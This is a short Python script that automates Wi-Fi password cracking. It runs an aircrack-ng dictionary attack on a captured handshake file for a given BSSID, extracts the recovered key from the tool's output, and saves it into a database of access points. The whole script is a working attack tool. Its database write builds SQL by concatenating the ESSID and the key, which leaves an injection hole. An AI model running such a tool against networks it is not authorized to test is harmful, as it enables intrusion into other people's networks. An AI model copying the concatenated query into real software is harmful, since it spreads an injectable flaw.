#!/usr/bin/python

import subprocess
import string
from database import *
import sys

def crak(BSSID, file, wordlist="/usr/share/dict/british-english"):
	command=["aircrack-ng","-w"]
	command.append(wordlist)
	command.append("-b")
	command.append(BSSID)
	command.append(file)
	uit=open ("/home/isis/output.txt", "w")
	print command
	proc_aircrack=subprocess.Popen(command, stdout=uit, stderr=uit)
	proc_aircrack.wait()
	uit.close()

def process_output():
	file=open ("/home/isis/output.txt", "r")
	key="-1"
	text=""
	for line in file:
		if "KEY FOUND" in line and key=="-1":
			key=line[24:-7]
	return key

def post(ESSID, key):
	if key!="-1":
		query= "update ap_info set wifi_key = '"
		query+=key
		query+="' where wifi_network = '"
		query+=ESSID
		query+="';"
		executequery(query)
	else:
		raise Exception("cracking failed") 

def automate(BSSID, ESSID, file="psk-01.cap"):
	file= "/home/isis/"+file
	crak(BSSID, file)
	key=process_output()
	post(ESSID, key)

if __name__ == '__main__':
	BSSID=sys.argv[1]
	ESSID=sys.argv[2]
	file=sys.argv[3]
	automate(BSSID, ESSID, file)
